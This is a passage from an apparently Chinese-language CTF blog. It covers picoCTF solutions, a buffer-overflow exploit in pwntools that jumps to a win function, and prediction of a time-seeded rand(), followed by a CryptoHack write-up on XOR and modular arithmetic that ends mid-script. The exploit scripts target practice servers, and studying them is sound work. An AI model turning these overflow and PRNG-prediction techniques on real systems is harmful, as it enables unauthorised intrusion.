printf(<span class="hljs-string">&quot;%s %s&quot;</span>, <span class="hljs-string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,<br>                    <span class="hljs-string">&quot;own debugging flag.\n&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br><br>  fgets(buf,FLAGSIZE,f);<br>  printf(buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>看來要我們透過<strong>overflow</strong>去跳到<strong>win fuction</strong>得到<strong>flag</strong></p><p>開始解題：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$file</span> vuln</span><br>vuln: ELF <span class="hljs-number">32</span>-bit LSB executable<br></code></pre></td></tr></table></figure><p>可以知道這個檔案是<strong>Little Endian 32-bit</strong></p><p><code>objdump</code> 找<strong>win fuction</strong>的位置<strong>0x80491f6</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">$ objdump -<span class="hljs-keyword">D</span> vuln | grep <span class="hljs-keyword">win</span>                     <br>080491f6 &lt;<span class="hljs-keyword">win</span>&gt;:<br>804922c:       75 2a                   jne    8049258 &lt;<span class="hljs-keyword">win</span>+0x62&gt;<br></code></pre></td></tr></table></figure><p>以下是script：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">from pwn <span class="hljs-built_in">import</span> <span class="hljs-operator">*</span><br><br><span class="hljs-attr">r</span> <span class="hljs-operator">=</span> remote(<span class="hljs-string">&quot;saturn.picoctf.net&quot;</span>,<span class="hljs-number">62944</span>)<br><br>r.sendline(b<span class="hljs-string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<span class="hljs-char escape_">\x</span>f6<span class="hljs-char escape_">\x</span>91<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>08&quot;</span>)<br><br>print(r.recvall())<br></code></pre></td></tr></table></figure><h3 id="h3seed-sPRiNG"><a href="#h3seed-sPRiNG" class="headerlink" title="h3seed-sPRiNG"></a>h3seed-sPRiNG</h3><p><img src="https://hackmd.io/_uploads/Hycs-o-Qkl.png" alt="image"><br>這題要你猜30次數字，猜完就會給你FLAG，並且這題還有給你.ELF檔。</p><p>連線後要你猜數字，隨便打，沒料，<del>畢竟不是天天過年</del>。<br><img src="https://hackmd.io/_uploads/H1UmGi-Xyg.png" alt="image"></p><p>.ELF都給了就開開看<br>跟想的一樣只要通過30次就會給FLAG。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">30</span>; ++i )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;LEVEL (%d/30)\n&quot;</span>, i);<br>    <span class="hljs-built_in">puts</span>(&amp;unk_A50, v9, v10, i);<br>    v3 = <span class="hljs-built_in">rand</span>((<span class="hljs-type">int</span>)p_argc);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Guess the height: &quot;</span>, v3 &amp; <span class="hljs-number">0xF</span>);<br>    <span class="hljs-built_in">fflush</span>(stdout);<br>    v9 = (<span class="hljs-type">int</span> *)&amp;v8;<br>    ((<span class="hljs-built_in">void</span> (__cdecl *)(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *))__isoc99_scanf)(<span class="hljs-string">&quot;%d&quot;</span>);<br>    <span class="hljs-built_in">fflush</span>(stdin);<br>    <span class="hljs-keyword">if</span> ( v9 != v8 )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;WRONG! Sorry, better luck next time!&quot;</span>, v9, v10, i);<br>      <span class="hljs-built_in">fflush</span>(stdout);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>, v9, v10, i);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Congratulation! You&#x27;ve won! Here is your flag:\n&quot;</span>, v9, v10, i);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  <span class="hljs-built_in">get_flag</span>();<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br></code></pre></td></tr></table></figure><p>開始解題：<br>首先，我們要知道rand()這個Fuction不是真的隨機取數，而是<strong>偽隨機數</strong>。<br>就跟<del>章魚燒裡的章魚不是章魚一樣</del>。<br>rand()中有一個種子，這個種子是一個定值，並決定隨機數的起始狀態，進而生成數字序列<strong>不管執行幾遍的結果，只要種子沒有變，rand出來的值都會是一樣的</strong>，舉個🌰，我們設置種子是3，並執行3次來看看結果。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;固定種子的結果:\n&quot;</span>);<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">// 固定種子</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;<span class="hljs-number">5</span> ; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, <span class="hljs-built_in">rand</span>()%<span class="hljs-number">10</span>); <span class="hljs-comment">// 限制範圍到 0~9</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>first Output：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">固定種子的結果:<br>8<span class="hljs-number"> 6 </span>4<span class="hljs-number"> 1 </span>1<span class="hljs-number"> 7 </span>2<span class="hljs-number"> 3 </span>7 8<br></code></pre></td></tr></table></figure><p>second Output：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">固定種子的結果:<br>8<span class="hljs-number"> 6 </span>4<span class="hljs-number"> 1 </span>1<span class="hljs-number"> 7 </span>2<span class="hljs-number"> 3 </span>7 8<br></code></pre></td></tr></table></figure><p>third Output：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">固定種子的結果:<br>8<span class="hljs-number"> 6 </span>4<span class="hljs-number"> 1 </span>1<span class="hljs-number"> 7 </span>2<span class="hljs-number"> 3 </span>7 8<br></code></pre></td></tr></table></figure><p>從以上3次輸出可以看到結果都一樣。</p><p>那我們回來題目，</p><p><del>這題的判斷用到神奇的妙妙小工具</del></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">v10</span> <span class="hljs-operator">=</span> time(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span><br>  srand(v10)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>這是什麼???<br>可以說這個是<code>srand(time(0))</code>，那這又是什麼?</p><p><code>time(0)</code>會取得現在的系統時間(以秒為單位)。再舉個🌰。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now time:%d\n&quot;</span>,<span class="hljs-built_in">time</span>(<span class="hljs-number">0</span>));<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Output：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">Now</span> <span class="hljs-built_in">time</span>(<span class="hljs-built_in">second</span>):<span class="hljs-number">1732523212</span><br></code></pre></td></tr></table></figure><p>那設置<code>srand(time(0))</code>有什麼意義?<br>以前面說過的例子來說，**srand()**是用來設置rand()的種子。<br>所以<code>srand(time())</code>會取系統時間的時間來當做種子。<br>這樣做有什麼意義?<br>可以保證每次的數字都不一樣，提高安全性，因為時間是一直在變動的。<br>這題就是用<code>srand(time())</code>做判斷式的判斷值。</p><p>以下是Script：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-number">0</span>));<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">30</span>;i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d,%d\n&quot;</span>,i,<span class="hljs-built_in">rand</span>()&amp;<span class="hljs-number">0xF</span>);<br>&#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>這個程式會取得系統時間並輸出30次出來。<br>接著我們：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">./<span class="hljs-selector-tag">a</span> &amp;&amp; nc jupiter<span class="hljs-selector-class">.challenges</span><span class="hljs-selector-class">.picoctf</span><span class="hljs-selector-class">.org</span> <span class="hljs-number">34558</span><br></code></pre></td></tr></table></figure><p>執行腳本並nc server，這樣可以確保時間一樣，導致密碼也是一樣。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs leaf">$ ./a &amp;&amp; nc jupiter.challenges.picoctf.org 34558<br>1,7<br>2,14<br>3,9<br>4,4<br>5,3<br>6,11<br>7,11<br>8,13<br>9,0<br>10,1<br>11,8<br>12,7<br>13,1<br>14,15<br>15,9<br>16,14<br>17,9<br>18,10<br>19,13<br>20,9<br>21,12<br>22,0<br>23,13<br>24,6<br>25,3<br>26,9<br>27,5<br>28,15<br>29,8<br>30,2<br><br><br>                                                                             <br>                          <span class="hljs-punctuation">#</span>                mmmmm  mmmmm    &quot;    mm   m   mmm <br>  mmm    mmm    mmm    mmm<span class="hljs-punctuation">#</span>          mmm   <span class="hljs-punctuation">#</span>   &quot;<span class="hljs-punctuation">#</span> <span class="hljs-punctuation">#</span>   &quot;<span class="hljs-punctuation">#</span> mmm    <span class="hljs-punctuation">#</span>&quot;m  <span class="hljs-punctuation">#</span> m&quot;   &quot;<br> <span class="hljs-punctuation">#</span>   &quot;  <span class="hljs-punctuation">#</span>&quot;  <span class="hljs-punctuation">#</span>  <span class="hljs-punctuation">#</span>&quot;  <span class="hljs-punctuation">#</span>  <span class="hljs-punctuation">#</span>&quot; &quot;<span class="hljs-punctuation">#</span>         <span class="hljs-punctuation">#</span>   &quot;  <span class="hljs-punctuation">#</span><span class="hljs-keyword">mmm</span><span class="hljs-punctuation">#</span>&quot; <span class="hljs-punctuation">#</span><span class="hljs-keyword">mmmm</span>&quot;   <span class="hljs-punctuation">#</span>    <span class="hljs-punctuation">#</span> <span class="hljs-punctuation">#</span><span class="hljs-keyword">m</span> <span class="hljs-punctuation">#</span> <span class="hljs-punctuation">#</span>   mm<br>  &quot;&quot;&quot;m  <span class="hljs-punctuation">#</span>&quot;&quot;&quot;&quot;  <span class="hljs-punctuation">#</span>&quot;&quot;&quot;&quot;  <span class="hljs-punctuation">#</span>   <span class="hljs-punctuation">#</span>          &quot;&quot;&quot;m  <span class="hljs-punctuation">#</span>      <span class="hljs-punctuation">#</span>   &quot;m   <span class="hljs-punctuation">#</span>    <span class="hljs-punctuation">#</span>  <span class="hljs-punctuation">#</span> <span class="hljs-punctuation">#</span> <span class="hljs-punctuation">#</span>    <span class="hljs-punctuation">#</span><br> &quot;mmm&quot;  &quot;<span class="hljs-punctuation">#</span><span class="hljs-keyword">mm</span>&quot;  &quot;<span class="hljs-punctuation">#</span><span class="hljs-keyword">mm</span>&quot;  &quot;<span class="hljs-punctuation">#</span><span class="hljs-keyword">m</span><span class="hljs-punctuation">##</span>         &quot;mmm&quot;  <span class="hljs-punctuation">#</span>      <span class="hljs-punctuation">#</span>    &quot; mm<span class="hljs-punctuation">#</span><span class="hljs-keyword">mm</span>  <span class="hljs-punctuation">#</span>   <span class="hljs-punctuation">##</span>  &quot;mmm&quot;<br>                                                                             <br><br><br>Welcome! The game is easy: you jump on a sPRiNG.<br>How high will you fly?<br><br>LEVEL (1/30)<br><br>Guess the height:<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CRYPTOHACK Writeup</title>
    <link href="/Nineday.github.io/2025/09/14/post-title/"/>
    <url>/Nineday.github.io/2025/09/14/post-title/</url>
    
    <content type="html"><![CDATA[<h1 id="CRYPTOHACK-Writeup"><a href="#CRYPTOHACK-Writeup" class="headerlink" title="CRYPTOHACK Writeup"></a>CRYPTOHACK Writeup</h1><h1 id="Introduction-to-CryptoHack"><a href="#Introduction-to-CryptoHack" class="headerlink" title="Introduction to CryptoHack"></a>Introduction to CryptoHack</h1><h2 id="XOR-Starter"><a href="#XOR-Starter" class="headerlink" title="XOR Starter"></a>XOR Starter</h2><p><img src="https://hackmd.io/_uploads/r1mVqC5FJx.png" alt="image"></p><p><strong>Solution</strong></p><p>string &#x3D; label<br>key &#x3D;13<br>要求做XOR</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pyton">a = &quot;label&quot;<br>for i in range(0,5,1):<br>    print(chr(ord(a[i]) ^ 13),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h2 id="XOR-Properties"><a href="#XOR-Properties" class="headerlink" title="XOR Properties"></a>XOR Properties</h2><p><img src="https://hackmd.io/_uploads/HJxvfyjYyx.png" alt="image"></p><p><strong>Solution</strong><br>這題看起來複雜，<del>事實上很複雜</del></p><p><strong>KEY２:</strong><br>KEY2 ⊕ KEY1可以等於<br><code>(KEY2 ⊕ KEY1) ⊕ (KEY1 ⊕ KEY1)＝(KEY2 ⊕ KEY1) ⊕ KEY1</code><br>接著根據結合律<br><code>KEY2 ⊕ (KEY1 ⊕ KEY1)= KEY2</code></p><p>所以：<code>KEY2= 37dcb292030faa90d07eec17e3b1c6d8daf94c35d4c9191a5e1e</code></p><p><strong>KEY3:</strong><br>跟KEY2原理一樣<br>KEY2 ⊕ KEY3可以等於<br><code>(KEY3 ⊕ KEY2) ⊕ (KEY2 ⊕ KEY2)＝(KEY3 ⊕ KEY2) ⊕ KEY2</code><br>接著根據結合律<br><code>KEY3 ⊕ (KEY2 ⊕ KEY2)= KEY3</code></p><p>所以：<code>KEY3= c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1</code></p><p>最後我們有了KEY1,KEY2,KEY3了<br>只要把KEY都帶進去就可以得到FLAG<br>記得在做XOR要先做位元換算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pyton">from pwn import *<br><br>KEY1 = bytes.fromhex(&quot;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313&quot;)<br>KEY2_KEY1 = bytes.fromhex(&quot;37dcb292030faa90d07eec17e3b1c6d8daf94c35d4c9191a5e1e&quot;)<br>KEY2_KEY3 = bytes.fromhex(&quot;c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1&quot;)<br>FLAG_KEY123 = bytes.fromhex(&quot;04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf&quot;)<br><br>flag = xor(FLAG_KEY123, KEY2_KEY3, KEY1)<br><br>print(flag.decode())<br></code></pre></td></tr></table></figure><h2 id="Favourite-byte"><a href="#Favourite-byte" class="headerlink" title="Favourite byte"></a><strong>Favourite byte</strong></h2><p><img src="https://hackmd.io/_uploads/H1_nWejKJx.png" alt="image"><br>這題給了KEY是single byte(單字節)的提示<br>所以可以用暴力破解，把密文跑過1個byte</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pyton">b = &quot;73626960647f6b206821204f21254f7d694f7624662065622127234f726927756d&quot;<br>c = bytes.fromhex(b)<br>for key in range(256):<br>    d = bytes([b ^ key for b in c])  <br>    print(d.decode()) <br></code></pre></td></tr></table></figure><h2 id="You-either-know-XOR-you-don’t"><a href="#You-either-know-XOR-you-don’t" class="headerlink" title="You either know, XOR you don’t"></a>You either know, XOR you don’t</h2><p><img src="https://hackmd.io/_uploads/BJauHljYJg.png" alt="image"><br>這題的key並沒有直接表示，但我們可以知道明文的開頭一定是<code>crypto&#123;</code><br>所以我們只要把開頭帶進去就可以得知KEY</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pyton">b = &quot;0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104&quot;<br>c = bytes.fromhex(b)<br>key = &quot;crypto&#123;&quot;<br><br>d = bytearray(byte ^ ord(key[i % len(key)]) for i, byte in enumerate(c))<br><br>print(d.decode())<br></code></pre></td></tr></table></figure><p>接著再帶進去，FALG就出來了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pyton">b=&quot;0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104&quot;<br>c = bytes.fromhex(b)<br>key = &quot;myXORkey&quot;<br><br># 解密：利用 XOR 解密每個字節<br>d = bytearray(byte ^ ord(key[i % len(key)]) for i, byte in enumerate(c))<br><br># 輸出解密後的明文<br>print(d.decode())<br></code></pre></td></tr></table></figure><h1 id="Modular-Arithmetic"><a href="#Modular-Arithmetic" class="headerlink" title="Modular Arithmetic"></a>Modular Arithmetic</h1><h2 id="Greatest-Common-Divisor"><a href="#Greatest-Common-Divisor" class="headerlink" title="Greatest Common Divisor"></a>Greatest Common Divisor</h2><p><img src="https://hackmd.io/_uploads/SyPhHWsK1e.png" alt="image"><br>這題要找最大公因數</p><h3 id="輾轉相除法-歐幾里得算法，Euclidean-algorithm"><a href="#輾轉相除法-歐幾里得算法，Euclidean-algorithm" class="headerlink" title="輾轉相除法(歐幾里得算法，Euclidean algorithm)"></a>輾轉相除法(歐幾里得算法，Euclidean algorithm)</h3><ol><li>取A,B兩個不為0的整數，並A&gt;&#x3D;B</li><li>A÷B的商與餘(A&#x3D;Bq+r)</li><li>如果r&#x3D;0，那B就是A最大公因數</li><li>如果r≠0，則A&#x3D;B，B&#x3D;r，繼續計算下去</li></ol><h2 id="Extended-GCD"><a href="#Extended-GCD" class="headerlink" title="Extended GCD"></a>Extended GCD</h2><p><img src="https://hackmd.io/_uploads/ry7OHM-2ye.png" alt="image"><br>這題要用擴充歐基里得演算法，求u,v</p><blockquote><p>pip python -m pip install egcd</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pyton">from egcd import egcd<br>a = 26513<br>b = 32321<br>print(egcd(a, b))<br></code></pre></td></tr></table></figure><p>output：(1, 10245, -8404)</p><blockquote><p><a href="https://www.youtube.com/watch?v=Au0zVvkmvr0">https://www.youtube.com/watch?v=Au0zVvkmvr0</a> 參考影片</p></blockquote><h2 id="Modular-Arithmetic-1"><a href="#Modular-Arithmetic-1" class="headerlink" title="Modular Arithmetic 1"></a>Modular Arithmetic 1</h2><p><img src="https://hackmd.io/_uploads/Skq4W8Whkl.png" alt="image"><br><strong>模的概念</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-number">11%</span><span class="hljs-number">6</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-number">8146798528947%</span><span class="hljs-number">17</span>)</span></span><br></code></pre></td></tr></table></figure><h2 id="Modular-Arithmetic-2"><a href="#Modular-Arithmetic-2" class="headerlink" title="Modular Arithmetic 2"></a>Modular Arithmetic 2</h2><p><img src="https://hackmd.io/_uploads/Byc1M8-nyl.png" alt="image"><br>這題要用費馬小定理(Fermat’s little theorem)<br>p &#x3D; 65537<br>根據費馬小定理：<strong>對於一個質數𝑝 和任何不被𝑝 整除的整數𝑎</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pyton">aᵖ⁻¹≡1(mod p)<br>65537是質數，所以<br>a⁶⁵⁵³⁶ ≡ 1 (mod 65537)<br></code></pre></td></tr></table></figure><p>aᵖ≡a(mod p)</p><blockquote><p>費馬小定理：<a href="https://ithelp.ithome.com.tw/articles/10205906">https://ithelp.ithome.com.tw/articles/10205906</a></p></blockquote><h2 id="Modular-Inverting"><a href="#Modular-Inverting" class="headerlink" title="Modular Inverting"></a>Modular Inverting</h2><p><img src="https://hackmd.io/_uploads/BJeEqH8h1l.png" alt="image"><br>這題給你：3*d ≡ 1(mod 13)<br>把d逆推回去就可以知道答案了。</p><h2 id="Quadratic-Residues"><a href="#Quadratic-Residues" class="headerlink" title="Quadratic Residues"></a>Quadratic Residues</h2><p><img src="https://hackmd.io/_uploads/B1x-nBUh1e.png" alt="image"><br><strong>二次剩餘定義：<br>有一個數 X，X²≡d(mod p)成立時，d是模p的二次剩餘(quadratic residues)<br>反之不成立，則稱d是模p的二次非剩餘(non-quadratic)</strong></p><p>題目給了3個數字，兩個二次非剩餘，一個二次剩餘。<br>不知道是哪個，我們直接用python帶進去迴圈看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pyton">p = 29<br>ints = [14, 6, 11]<br>flag = 100000 # max<br>for n in ints:<br>    for a in range(1,29):<br>        if pow(a,2,p) == n:<br>            flag = min(flag,a)<br>print(flag)<br></code></pre></td></tr></table></figure><h2 id="Legendre-Symbol"><a href="#Legendre-Symbol" class="headerlink" title="Legendre Symbol"></a>Legendre Symbol</h2><p><img src="https://hackmd.io/_uploads/SJ3sjxFhyl.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pyton">p = 101524035174539890485408575671085261788758965189060164484385690801466167356667036677932998889725476582421738788500738738503134356158197247473850273565349249573867251280253564698939768700489401960767007716413932851838937641880157263936985954881657889497583485535527613578457628399173971810541670838543309159139<br><br>ints = [25081841204695904475894082974192007718642931811040324543182130088804239047149283334700530600468528298920930150221871666297194395061462592781551275161695411167049544771049769000895119729307495913024360169904315078028798025169985966732789207320203861858234048872508633514498384390497048416012928086480326832803, 45471765180330439060504647480621449634904192839383897212809808339619841633826534856109999027962620381874878086991125854247108359699799913776917227058286090426484548349388138935504299609200377899052716663351188664096302672712078508601311725863678223874157861163196340391008634419348573975841578359355931590555, 17364140182001694956465593533200623738590196990236340894554145562517924989208719245429557645254953527658049246737589538280332010533027062477684237933221198639948938784244510469138826808187365678322547992099715229218615475923754896960363138890331502811292427146595752813297603265829581292183917027983351121325, 14388109104985808487337749876058284426747816961971581447380608277949200244660381570568531129775053684256071819837294436069133592772543582735985855506250660938574234958754211349215293281645205354069970790155237033436065434572020652955666855773232074749487007626050323967496732359278657193580493324467258802863, 4379499308310772821004090447650785095356643590411706358119239166662089428685562719233435615196994728767593223519226235062647670077854687031681041462632566890129595506430188602238753450337691441293042716909901692570971955078924699306873191983953501093343423248482960643055943413031768521782634679536276233318, 85256449776780591202928235662805033201684571648990042997557084658000067050672130152734911919581661523957075992761662315262685030115255938352540032297113615687815976039390537716707854569980516690246592112936796917504034711418465442893323439490171095447109457355598873230115172636184525449905022174536414781771, 50576597458517451578431293746926099486388286246142012476814190030935689430726042810458344828563913001012415702876199708216875020997112089693759638454900092580746638631062117961876611545851157613835724635005253792316142379239047654392970415343694657580353333217547079551304961116837545648785312490665576832987, 96868738830341112368094632337476840272563704408573054404213766500407517251810212494515862176356916912627172280446141202661640191237336568731069327906100896178776245311689857997012187599140875912026589672629935267844696976980890380730867520071059572350667913710344648377601017758188404474812654737363275994871, 4881261656846638800623549662943393234361061827128610120046315649707078244180313661063004390750821317096754282796876479695558644108492317407662131441224257537276274962372021273583478509416358764706098471849536036184924640593888902859441388472856822541452041181244337124767666161645827145408781917658423571721, 18237936726367556664171427575475596460727369368246286138804284742124256700367133250078608537129877968287885457417957868580553371999414227484737603688992620953200143688061024092623556471053006464123205133894607923801371986027458274343737860395496260538663183193877539815179246700525865152165600985105257601565]<br><br>a = 0<br>for i in ints:<br>    if pow(i,(p-1)//2,p) == 